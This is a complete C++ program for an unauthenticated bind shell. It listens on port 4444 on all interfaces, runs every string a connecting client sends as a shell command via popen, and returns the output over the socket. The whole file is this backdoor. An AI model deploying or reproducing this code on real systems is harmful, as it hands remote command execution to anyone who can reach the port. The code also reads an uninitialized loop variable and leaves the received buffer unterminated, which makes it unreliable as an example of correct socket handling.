#include <iostream>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include<cstring>
#include <cstdlib> 
#include <cstdio>  

#define PORT 4444

int main(int argc, char const* argv[]) {
    //Create a socket
    int ServerFD = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in Address;
    Address.sin_family = AF_INET;
    Address.sin_port = htons(PORT);
    Address.sin_addr.s_addr = INADDR_ANY;

    if (bind(ServerFD, (struct sockaddr*)&Address, sizeof(Address)) == -1) {
        std::cerr << "bind failed" << std::endl;
        exit(1); 
    }

    // Listen for incoming connections
    if (listen(ServerFD, 6) == -1) {
        std::cerr << "listen failed" << std::endl;
        exit(1); 
    }

    // Accept incoming connections
    int ClientSocket = accept(ServerFD, NULL, NULL);
    if (ClientSocket == -1) {
        std::cerr << "accept failed" << std::endl;
        exit(1); 
    }

    char buffer[1024];
    int bytesReceived;

    while (bytesReceived) {
        // Receive data from the client
        bytesReceived = recv(ClientSocket, buffer, sizeof(buffer), 0);

        if (bytesReceived < 0) {
            std::cerr << "Client disconnected" << std::endl;
            exit(1);         
        }

        // // Null-terminate the received data
        // buffer[bytesReceived] = '\0';

        // Execute the received message as a command using popen
        FILE* commandPip = popen(buffer, "r");

        if (commandPip == nullptr) {
            std::cerr << "Execution failed" << std::endl;
            exit(1);
        } else {
            // Read the output of the command
            while (fgets(buffer, sizeof(buffer), commandPip) != nullptr) {
                // Send the command output back to the client
                send(ClientSocket, buffer, strlen(buffer), 0);
            }

            // Close the command output pipe
            pclose(commandPip);
        }
    }

    // Close the connection when the loop ends
    close(ClientSocket);
    close(ServerFD);

    return 0;
}
